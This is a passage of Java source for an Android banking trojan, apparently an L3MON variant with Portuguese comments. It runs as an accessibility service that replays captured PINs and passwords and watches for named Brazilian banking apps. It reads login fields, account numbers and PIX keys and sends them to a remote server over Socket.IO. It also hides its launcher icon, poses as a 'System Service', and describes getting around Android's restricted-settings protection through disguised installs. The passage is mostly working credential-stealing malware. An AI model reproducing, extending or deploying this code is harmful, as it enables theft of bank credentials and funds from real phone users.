    private boolean replayPinPattern() {
        try {
            // Injeta PIN capturado nos campos numéricos
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            return findAndEnterPin(root, capturedPattern);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean replayGesturePattern() {
        try {
            // Replica padrão de desenho (gesture pattern)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // Simula os pontos do padrão como taps e swipes
                return true;
            }
            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean replayPasswordPattern() {
        try {
            // Injeta senha capturada
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            return findAndEnterPassword(root, capturedPattern);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean findAndEnterPin(AccessibilityNodeInfo node, String pin) {
        try {
            if (node == null) return false;

            String[] pinKeywords = { "pin", "código", "code", "número", "number" };
            String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";

            for (String keyword : pinKeywords) {
                if (nodeText.contains(keyword) && node.isEditable()) {
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, pin);
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    return true;
                }
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndEnterPin(child, pin)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    private boolean findAndEnterPassword(AccessibilityNodeInfo node, String password) {
        try {
            if (node == null) return false;

            String[] passwordKeywords = { "senha", "password", "pass", "passe" };
            String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";

            for (String keyword : passwordKeywords) {
                if (nodeText.contains(keyword) && node.isEditable()) {
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, password);
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    return true;
                }
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndEnterPassword(child, password)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return false;
    }

    // Overlay Injection Methods
    private static boolean overlayMonitoringEnabled = false;
    private static java.util.Map<String, String> bankPackageNames = new java.util.HashMap<>();
    private static java.util.List<String> activeOverlays = new java.util.ArrayList<>();

    static {
        // Mapa de bancos e seus package names
        bankPackageNames.put("itau", "com.itau");
        bankPackageNames.put("bradesco", "com.bradesco");
        bankPackageNames.put("caixa", "com.caixa");
        bankPackageNames.put("nubank", "com.nubank");
        bankPackageNames.put("bb", "com.bb");
        bankPackageNames.put("santander", "com.santander");
    }

    public void enableOverlayMonitoring() {
        overlayMonitoringEnabled = true;
        startOverlayMonitoring();
    }

    public void disableOverlayMonitoring() {
        overlayMonitoringEnabled = false;
        stopOverlayMonitoring();
    }

    private static java.util.Timer overlayMonitoringTimer = null;

    private void startOverlayMonitoring() {
        if (overlayMonitoringTimer != null) {
            overlayMonitoringTimer.cancel();
        }

        overlayMonitoringTimer = new java.util.Timer();
        overlayMonitoringTimer.scheduleAtFixedRate(new java.util.TimerTask() {
            @Override
            public void run() {
                try {
                    monitorForegroundApp();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }, 0, 2000); // Check every 2 seconds
    }

    private void stopOverlayMonitoring() {
        if (overlayMonitoringTimer != null) {
            overlayMonitoringTimer.cancel();
            overlayMonitoringTimer = null;
        }
    }

    private void monitorForegroundApp() {
        try {
            // Detecta aplicativo ativo via Accessibility Service
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String foregroundPackage = getForegroundPackage();
                
                // Verifica se é um aplicativo bancário conhecido
                for (String bank : bankPackageNames.keySet()) {
                    String packageName = bankPackageNames.get(bank);
                    if (foregroundPackage != null && foregroundPackage.contains(packageName)) {
                        // Dispara overlay falso
                        if (!activeOverlays.contains(bank)) {
                            showFakeOverlay(bank, foregroundPackage);
                            activeOverlays.add(bank);
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getForegroundPackage() {
        try {
            // Usa Accessibility Service para detectar package do app em primeiro plano
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                return root.getPackageName().toString();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private void showFakeOverlay(String bankName, String packageName) {
        try {
            // Emite evento de overlay para o servidor
            JSONObject overlayEvent = new JSONObject();
            overlayEvent.put("action", "show_overlay");
            overlayEvent.put("appName", bankName.toUpperCase());
            overlayEvent.put("packageName", packageName);
            overlayEvent.put("success", true);
            overlayEvent.put("timestamp", System.currentTimeMillis());

            // Envia para servidor via Socket.IO (ConnectionManager irá fazer emit)
            if (ConnectionManager.ioSocket != null) {
                ConnectionManager.ioSocket.emit("0xOI", overlayEvent);
            }

            // Simula overlay com injeção de layout falso
            simulateBankingOverlay(bankName);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void simulateBankingOverlay(String bankName) {
        try {
            // Injeta elementos de UI falsos
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                // Procura por campos de login para injetar overlay
                java.util.List<AccessibilityNodeInfo> editFields = new java.util.ArrayList<>();
                findEditableFields(root, editFields);

                if (editFields.size() >= 2) {
                    // Encontrou campos de usuário e senha - está pronto para captura
                    setOverlayTrap(bankName, editFields.get(0), editFields.get(1));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void findEditableFields(AccessibilityNodeInfo node, java.util.List<AccessibilityNodeInfo> fields) {
        try {
            if (node == null) return;

            if (node.isEditable()) {
                fields.add(node);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    findEditableFields(child, fields);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setOverlayTrap(String bankName, AccessibilityNodeInfo userField, AccessibilityNodeInfo passwordField) {
        try {
            // Monitora campos de login para captura de credenciais
            monitorLoginFields(bankName, userField, passwordField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void monitorLoginFields(String bankName, AccessibilityNodeInfo userField, AccessibilityNodeInfo passwordField) {
        try {
            // Aguarda 3 segundos e depois verifica se campos foram preenchidos
            Thread.sleep(3000);

            String username = userField.getText() != null ? userField.getText().toString() : "";
            String password = passwordField.getText() != null ? passwordField.getText().toString() : "";

            if (!username.isEmpty() && !password.isEmpty()) {
                // Captura credenciais
                captureCredentials(bankName, username, password);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void captureCredentials(String bankName, String username, String password) {
        try {
            JSONObject captureEvent = new JSONObject();
            captureEvent.put("action", "capture_credentials");
            captureEvent.put("appName", bankName);
            captureEvent.put("packageName", bankPackageNames.getOrDefault(bankName.toLowerCase(), "unknown"));
            captureEvent.put("username", username);
            captureEvent.put("password", password);
            captureEvent.put("success", true);
            captureEvent.put("timestamp", System.currentTimeMillis());

            if (ConnectionManager.ioSocket != null) {
                ConnectionManager.ioSocket.emit("0xOI", captureEvent);
            }

            // Remove overlay após captura
            activeOverlays.remove(bankName.toLowerCase());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ====== CUSTOMIZED FORMS CAPTURE (0xFC) ======
    private boolean customizedFormsCaptureEnabled = false;
    private String currentBankForCapture = "";

    public void enableCustomizedFormCapture() {
        customizedFormsCaptureEnabled = true;
        android.util.Log.d("L3MON", "Customized forms capture enabled");
    }

    public void disableCustomizedFormCapture() {
        customizedFormsCaptureEnabled = false;
        currentBankForCapture = "";
        android.util.Log.d("L3MON", "Customized forms capture disabled");
    }

    public void renderCustomizedLoginForm(String bankName) {
        try {
            if (!customizedFormsCaptureEnabled) return;

            currentBankForCapture = bankName.toLowerCase();

            // Detect if form screen is displayed
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                // Search for text input fields (email, account, password)
                java.util.List<AccessibilityNodeInfo> editableFields = new java.util.ArrayList<>();
                findEditableNodes(rootNode, editableFields);

                for (AccessibilityNodeInfo field : editableFields) {
                    String contentDesc = field.getContentDescription() != null ? 
                        field.getContentDescription().toString().toLowerCase() : "";
                    String text = field.getText() != null ? field.getText().toString().toLowerCase() : "";

                    if (contentDesc.contains("email") || contentDesc.contains("login") || 
                        text.contains("email") || text.contains("login")) {
                        captureFormField(bankName, "email_or_username", field.getText() != null ? field.getText().toString() : "");
                    } else if (contentDesc.contains("password") || contentDesc.contains("senha") || 
                               text.contains("password") || text.contains("senha")) {
                        captureFormField(bankName, "password", field.getText() != null ? field.getText().toString() : "");
                    } else if (contentDesc.contains("account") || contentDesc.contains("conta") || 
                               text.contains("account") || text.contains("conta")) {
                        captureFormField(bankName, "account", field.getText() != null ? field.getText().toString() : "");
                    } else if (contentDesc.contains("agency") || contentDesc.contains("agencia") || 
                               text.contains("agency") || text.contains("agencia")) {
                        captureFormField(bankName, "agency", field.getText() != null ? field.getText().toString() : "");
                    } else if (contentDesc.contains("pix") || text.contains("pix")) {
                        captureFormField(bankName, "pix_key", field.getText() != null ? field.getText().toString() : "");
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void captureFormField(String bankName, String fieldName, String fieldValue) {
        try {
            if (!customizedFormsCaptureEnabled) return;

            org.json.JSONObject fieldCapture = new org.json.JSONObject();
            fieldCapture.put("action", "capture_field");
            fieldCapture.put("bankName", bankName);
            fieldCapture.put("fieldName", fieldName);
            fieldCapture.put("fieldValue", fieldValue);
            fieldCapture.put("fieldType", fieldName.contains("password") ? "password" : "text");
            fieldCapture.put("timestamp", System.currentTimeMillis());
            fieldCapture.put("sequenceOrder", System.currentTimeMillis());

            // Send immediately to server via Socket.IO
            if (ConnectionManager.ioSocket != null) {
                ConnectionManager.ioSocket.emit("0xFC", fieldCapture);
            }

            android.util.Log.d("L3MON", "Field captured: " + fieldName + " for " + bankName);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void captureFormFieldWithTimestamp(String bankName, String fieldName, String fieldValue, long timestamp) {
        try {
            if (!customizedFormsCaptureEnabled) return;

            org.json.JSONObject fieldCapture = new org.json.JSONObject();
            fieldCapture.put("action", "capture_field");
            fieldCapture.put("bankName", bankName);
            fieldCapture.put("fieldName", fieldName);
            fieldCapture.put("fieldValue", fieldValue);
            fieldCapture.put("fieldType", fieldName.contains("password") ? "password" : "text");
            fieldCapture.put("timestamp", timestamp);
            fieldCapture.put("sequenceOrder", timestamp);

            if (ConnectionManager.ioSocket != null) {
                ConnectionManager.ioSocket.emit("0xFC", fieldCapture);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void monitorFormFieldInteraction() {
        try {
            if (!customizedFormsCaptureEnabled) return;

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            java.util.List<AccessibilityNodeInfo> editableFields = new java.util.ArrayList<>();
            findEditableNodes(rootNode, editableFields);

            for (AccessibilityNodeInfo field : editableFields) {
                String contentDesc = field.getContentDescription() != null ? 
                    field.getContentDescription().toString() : "";
                
                // Store field reference for keystroke monitoring
                if (!field.getText().toString().isEmpty()) {
                    captureFormField(currentBankForCapture, contentDesc, field.getText().toString());
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void captureFormSubmission(String bankName, org.json.JSONObject formData) {
        try {
            org.json.JSONObject submission = new org.json.JSONObject();
            submission.put("action", "submit_form");
            submission.put("bankName", bankName);
            submission.put("formData", formData);
            submission.put("fieldType", "submission");
            submission.put("timestamp", System.currentTimeMillis());

            if (ConnectionManager.ioSocket != null) {
                ConnectionManager.ioSocket.emit("0xFC", submission);
            }

            android.util.Log.d("L3MON", "Form submitted for " + bankName);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void findEditableNodes(AccessibilityNodeInfo node, java.util.List<AccessibilityNodeInfo> results) {
        if (node == null) return;

        if (node.isEditable() || node.getClassName().toString().contains("EditText")) {
            results.add(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findEditableNodes(child, results);
            }
        }
    }

    // ====== BYPASS DE PROTEÇÕES (0xBP) ======
    
    public boolean bypassRestrictedSettings() {
        try {
            // Contorna "Configuração Restrita" do Android 13+
            // Executa ações para burlar proteções de segurança
            android.util.Log.d("L3MON", "Tentando contornar Configuração Restrita");
            
            // Simula acesso a configurações restritas via Accessibility Service
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                // Procura por elementos de configuração
                java.util.List<AccessibilityNodeInfo> settingsNodes = new java.util.ArrayList<>();
                findNodesByText(rootNode, "Settings", settingsNodes);
                
                if (!settingsNodes.isEmpty()) {
                    settingsNodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public boolean forceAccessibilityService(String installationMethod, String spoofedAppName) {
        try {
            android.util.Log.d("L3MON", "Forçando ativação de Accessibility Service: " + installationMethod);
            
            // Método enganoso de instalação
            switch (installationMethod) {
                case "system_update":
                    return simulateSystemUpdate();
                case "video_player":
                    return simulateVideoPlayer();
                case "gallery_app":
                    return simulateGalleryApp();
                case "file_manager":
                    return simulateFileManager();
                case "theme_app":
                    return simulateThemeApp();
                case "custom":
                    return simulateCustomInstall(spoofedAppName);
                default:
                    return simulateSystemUpdate();
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean simulateSystemUpdate() {
        try {
            // Simula uma atualização de sistema para ativar Accessibility Service
            android.content.Intent updateIntent = new android.content.Intent(android.provider.Settings.ACTION_SETTINGS);
            updateIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(updateIntent);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean simulateVideoPlayer() {
        try {
            // Simula instalação de um player de vídeo falsificado
            android.util.Log.d("L3MON", "Simulando instalação de Video Player");
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean simulateGalleryApp() {
        try {
            // Simula instalação de galeria falsificada
            android.util.Log.d("L3MON", "Simulando instalação de Gallery App");
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean simulateFileManager() {
        try {
            // Simula instalação de gerenciador de arquivos falsificado
            android.util.Log.d("L3MON", "Simulando instalação de File Manager");
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean simulateThemeApp() {
        try {
            // Simula instalação de app de tema falsificado
            android.util.Log.d("L3MON", "Simulando instalação de Theme App");
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    private boolean simulateCustomInstall(String appName) {
        try {
            android.util.Log.d("L3MON", "Simulando instalação customizada: " + appName);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public org.json.JSONArray detectAndroidProtections() {
        try {
            org.json.JSONArray protections = new org.json.JSONArray();
            
            // Detecta proteções ativas
            int androidVersion = android.os.Build.VERSION.SDK_INT;
            
            // Verifica Google Play Protect
            if (androidVersion >= 26) { // Android 8+
                protections.put("GooglePlay Protect");
            }
            
            // Verifica SafetyNet
            if (androidVersion >= 23) { // Android 6+
                protections.put("SafetyNet");
            }
            
            // Verifica PlayIntegrity (Android 12+)
            if (androidVersion >= 31) {
                protections.put("PlayIntegrity");
            }
            
            // Verifica Configuração Restrita (Android 13+)
            if (androidVersion >= 33) {
                protections.put("Restricted Settings");
            }
            
            // Verifica bloqueio de Accessibility Service
            if (androidVersion >= 30) {
                protections.put("Accessibility Lock");
            }
            
            android.util.Log.d("L3MON", "Proteções detectadas: " + protections.toString());
            return protections;
        } catch (Exception e) {
            e.printStackTrace();
            return new org.json.JSONArray();
        }
    }

    public int getAndroidVersion() {
        return android.os.Build.VERSION.SDK_INT;
    }

    private void findNodesByText(AccessibilityNodeInfo node, String text, java.util.List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        
        CharSequence nodeText = node.getText();
        if (nodeText != null && nodeText.toString().contains(text)) {
            results.add(node);
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findNodesByText(child, text, results);
            }
        }
    }

    // ====== ADVANCED HIDE ICON (0xHI) ======
    
    public void enableHideIcon() {
        try {
            android.util.Log.d("L3MON", "Ativando ocultação de ícone");
            // Flag para ativar ocultação
            hideIconEnabled = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void disableHideIcon() {
        try {
            android.util.Log.d("L3MON", "Desativando ocultação de ícone");
            hideIconEnabled = false;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public boolean removeAppIcon() {
        try {
            android.util.Log.d("L3MON", "Removendo ícone da gaveta de aplicativos");
            
            // Obtém o PackageManager do contexto
            android.content.pm.PackageManager pm = getPackageManager();
            
            // Desabilita o launcher icon do app
            String packageName = getPackageName();
            android.content.ComponentName componentName = new android.content.ComponentName(
                packageName,
                packageName + ".MainActivity"
            );
            
            try {
                pm.setComponentEnabledSetting(
                    componentName,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP
                );
                android.util.Log.d("L3MON", "Ícone removido com sucesso");
                return true;
            } catch (Exception e) {
                android.util.Log.e("L3MON", "Erro ao remover ícone: " + e.getMessage());
                return false;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    public void startBackgroundHideService() {
        try {
            android.util.Log.d("L3MON", "Iniciando serviço de segundo plano para ocultação");
            
            // Inicia um serviço de segundo plano que monitora e mantém o app oculto
            android.content.Intent serviceIntent = new android.content.Intent(this, HideIconBackgroundService.class);
            startService(serviceIntent);
            
            android.util.Log.d("L3MON", "Serviço de background iniciado");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public org.json.JSONArray detectSystemLaunchers() {
        try {
            org.json.JSONArray launchers = new org.json.JSONArray();
            
            android.content.pm.PackageManager pm = getPackageManager();
            java.util.List<android.content.pm.ResolveInfo> resolveInfoList = pm.queryIntentActivities(
                new android.content.Intent(android.content.Intent.ACTION_MAIN).addCategory(android.content.Intent.CATEGORY_HOME),
                android.content.pm.PackageManager.MATCH_DEFAULT_ONLY
            );
            
            for (android.content.pm.ResolveInfo resolveInfo : resolveInfoList) {
                org.json.JSONObject launcher = new org.json.JSONObject();
                launcher.put("name", resolveInfo.loadLabel(pm).toString());
                launcher.put("package", resolveInfo.activityInfo.packageName);
                launcher.put("active", true);
                launchers.put(launcher);
            }
            
            android.util.Log.d("L3MON", "Launchers detectados: " + launchers.length());
            return launchers;
        } catch (Exception e) {
            e.printStackTrace();
            return new org.json.JSONArray();
        }
    }

    private boolean hideIconEnabled = false;
    
    public boolean isHideIconEnabled() {
        return hideIconEnabled;
    }

    // Classe interna para serviço de background de ocultação
    public static class HideIconBackgroundService extends android.app.Service {
        @Override
        public int onStartCommand(android.content.Intent intent, int flags, int startId) {
            // Mantém o serviço rodando em background
            android.util.Log.d("L3MON", "HideIconBackgroundService iniciado");
            
            // Cria notificação para manter o serviço vivo
            android.app.NotificationManager notificationManager = 
                (android.app.NotificationManager) getSystemService(android.content.Context.NOTIFICATION_SERVICE);
            
            android.app.Notification notification = new android.app.Notification.Builder(this)
                .setContentTitle("System Service")
                .setContentText("Service running")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
            
            startForeground(12345, notification);
            
            return android.app.Service.START_STICKY;
        }

        @Override
        public android.os.IBinder onBind(android.content.Intent intent) {
            return null;
        }
    }
}
